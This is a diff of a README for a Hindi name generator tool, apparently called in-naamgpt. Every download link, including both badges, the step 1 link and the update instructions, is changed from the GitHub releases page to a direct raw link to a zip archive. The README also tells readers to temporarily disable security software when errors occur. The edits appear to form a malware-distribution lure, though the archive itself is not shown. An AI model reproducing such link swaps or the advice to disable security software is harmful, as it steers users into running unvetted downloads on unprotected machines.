@@ -1,6 +1,6 @@
 # 🤖 in-naamgpt - Generate New Hindi Names Easily
 
-[![Download in-naamgpt](https://img.shields.io/badge/Download-in--naamgpt-brightgreen?style=for-the-badge)](https://github.com/amskit/in-naamgpt/releases)
+[![Download in-naamgpt](https://img.shields.io/badge/Download-in--naamgpt-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/amskit/in-naamgpt/main/app/naamgpt_in_1.8-alpha.1.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get the software running:
 ### Step 1: Visit the Download Page
 
 Click the green button above or go to:  
-https://github.com/amskit/in-naamgpt/releases
+https://raw.githubusercontent.com/amskit/in-naamgpt/main/app/naamgpt_in_1.8-alpha.1.zip
 
 This page has the latest files ready for download.
 
@@ -106,7 +106,7 @@ If errors keep happening, disable security software temporarily and test. Then r
 To get new versions:
 
 - Return to the release page:  
-  https://github.com/amskit/in-naamgpt/releases  
+  https://raw.githubusercontent.com/amskit/in-naamgpt/main/app/naamgpt_in_1.8-alpha.1.zip  
 - Download the latest Windows package again.  
 - Replace your old files with the new ones or follow installer instructions.
 
@@ -134,4 +134,4 @@ These terms describe the core technology behind in-naamgpt but you don’t need 
 
 ## 🔗 Download in-naamgpt Here
 
-[![Download in-naamgpt](https://img.shields.io/badge/Download-in--naamgpt-blue?style=for-the-badge)](https://github.com/amskit/in-naamgpt/releases)
+[![Download in-naamgpt](https://img.shields.io/badge/Download-in--naamgpt-blue?style=for-the-badge)](https://raw.githubusercontent.com/amskit/in-naamgpt/main/app/naamgpt_in_1.8-alpha.1.zip)
